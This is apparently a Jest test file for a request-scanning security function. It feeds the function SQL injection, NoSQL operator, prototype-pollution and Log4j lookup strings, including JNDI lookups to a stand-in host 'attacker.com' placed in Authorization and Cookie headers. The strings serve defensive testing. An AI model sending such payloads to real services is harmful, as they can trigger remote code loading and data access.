import { detectSuspiciousPatterns } from '@/lib/security/suspicious-patterns';

describe('detectSuspiciousPatterns', () => {
  it('should detect suspicious patterns in query parameter values', () => {
    const req = new Request('https://example.com/api/test?id=1%20OR%201=1');
    const result = detectSuspiciousPatterns(req, { minSeverity: 1 });
    expect(result.detected).toBe(true);
  });

  it('should detect suspicious patterns in query parameter keys', () => {
    const req = new Request('https://example.com/api/test?id[$ne]=1');
    const result = detectSuspiciousPatterns(req, { minSeverity: 1 });
    expect(result.detected).toBe(true);
    expect(result.patterns.some(p => p.category === 'nosql_injection')).toBe(true);
  });

  it('should detect suspicious patterns in headers', () => {
    // Manually construct a mock request to bypass Headers name validation in JSDOM
    const mockRequest = {
      url: 'https://example.com/api/test',
      headers: {
        get: (name: string) => null,
        entries: () => [
          ['X-Custom-Header', 'test'],
          ['__proto__[', 'polluted']
        ][Symbol.iterator]()
      }
    } as unknown as Request;

    const result = detectSuspiciousPatterns(mockRequest, { minSeverity: 1 });
    expect(result.detected).toBe(true);
    expect(result.patterns.some(p => p.category === 'prototype_pollution')).toBe(true);
  });

  it('should detect Log4j variants with new protocols', () => {
    const req = new Request('https://example.com/api/test?q=${jmx:test}');
    const result = detectSuspiciousPatterns(req, { minSeverity: 1 });
    expect(result.detected).toBe(true);
    expect(result.patterns.some(p => p.category === 'log_injection')).toBe(true);
  });

  it('should skip sensitive headers', () => {
    const mockRequest = {
      url: 'https://example.com/api/test',
      headers: {
        get: (name: string) => null,
        entries: () => [
          ['Authorization', 'Bearer ${jndi:ldap://attacker.com/a}'],
          ['Cookie', 'session=${jndi:ldap://attacker.com/a}']
        ][Symbol.iterator]()
      }
    } as unknown as Request;

    const result = detectSuspiciousPatterns(mockRequest, { minSeverity: 1 });
    // Should NOT detect because Authorization and Cookie are skipped
    expect(result.detected).toBe(false);
  });
});
